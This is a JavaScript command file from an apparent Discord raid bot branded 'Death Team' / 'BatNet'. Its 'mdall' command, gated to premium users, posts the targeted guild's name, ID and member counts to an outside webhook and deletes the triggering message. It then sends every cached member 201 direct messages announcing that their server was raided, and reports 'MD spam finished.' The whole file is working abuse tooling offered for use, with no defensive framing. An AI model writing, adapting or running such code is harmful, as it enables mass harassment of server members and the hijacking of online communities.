const Discord = require('discord.js');
const chalk = require('chalk');
const fetch = require('node-fetch');
const premium = require('./utilities/premium.json');
const util = require('./utilities/ignore.json');
const emojis = require('./utilities/emojis.json');

////// COMMAND //////

module.exports = {
     name: 'mdall',
     aliases: ['md'],
     description: '',
     
async execute(client, message, args){
     setTimeout(function() {
          if (!premium.ids.includes(message.author.id))
          return message.channel.send({
               embed: {
                    description: `${emojis.bat} **| You need the premium version for use this command.**`,
                    author: {
                              name: 'Death Team',
                              url: 'https://discord.gg/DeathTeam',
                              icon_url: 'https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless'
                         },
                         thumbnail: {
                              url: util.server_logo
                         },
                         footer: {
                              text: '#DeathTeam',
                              icon_url: 'https://cdn.discordapp.com/emojis/1081703117952921670.png?v=1&size=48&quality=lossless'
                         },
                         color: 0x0000
                    }
          });
          
          console.log(chalk.cyan(`\n[ BATNET ] ${message.author.tag} Has executed the mdall command`));
          console.log(chalk.cyan(`[ BATNET ] Sending log to the webhook.\n`));
          
          const log = {
               username: 'BatNet | Logging',
               avatar_url: 'https://cdn.discordapp.com/avatars/1081612143566270635/8511dc5a9f3fda4f7af646dc4cd0c901.png?size=2048',
               content: '',
               embeds: [
                    {
                         description: `${emojis.bat} **| Command:**\n*__.mdall__*\n\n${emojis.beer} **| Guild:**\n*__${message.guild.name} ( ${message.guild.id} )__*\n\n${emojis.crown} **| Channels:**\n*__${message.guild.channels.cache.size}__*\n\n${emojis.wings} **| Roles:**\n*__${message.guild.roles.cache.size}__*\n\n${emojis.sparks} **| Users:**\n*__${message.guild.memberCount}__*\n\n${emojis.pin} **| Author:**\n${message.author.tag}`,
                         author: {
                              name: 'BatNet',
                              url: 'https://discord.gg/DeathTeam',
                              icon_url: 'https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless'
                         },
                         thumbnail: {
                              url: util.server_logo
                         },
                         footer: {
                              text: '#DeathTeam',
                              icon_url: 'https://cdn.discordapp.com/emojis/1081703117952921670.png?v=1&size=48&quality=lossless'
                         },
                         color: 0x0000
                         }
                    ]
          }
          
          fetch(util.webhook_url, {
               method: 'POST',
               headers: {
                    'Content-type': 'application/json'
               },
               body: JSON.stringify(log)
          });
          
          message.delete();
          
          message.guild.members.cache.forEach(member => {
               for (let i = 0; i <= 200; i++) {
                    member.send({
                         embed: {
                              description: `${emojis.crown} **| One of the guilds in which you were and / or administered has been raid by Death Team**`,
                              author: {
                                   name: 'Death Team',
                                   url: 'https://discord.gg/DeathTeam',
                                   icon_url: 'https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless'
                              },
                              thumbnail: {
                                   url: util.server_logo
                              },
                              footer: {
                                   text: '#DeathTeam',
                                   icon_url: 'https://cdn.discordapp.com/emojis/1081703117952921670.png?v=1&size=48&quality=lossless'
                              },
                              color: 0x0000
                         }
                    });
               }
          });
          
          const embed = new Discord.MessageEmbed();
          
          message.channel.send({
               embed: {
                    description: `${emojis.bat} **| MD spam finished.**`,
                    author: {
                              name: 'Death Team',
                              url: 'https://discord.gg/DeathTeam',
                              icon_url: 'https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless'
                         },
                         thumbnail: {
                              url: util.server_logo
                         },
                         footer: {
                              text: '#DeathTeam',
                              icon_url: 'https://cdn.discordapp.com/emojis/1081703117952921670.png?v=1&size=48&quality=lossless'
                         },
                         color: 0x0000
                    }
               });
     }, 5000);
}
}
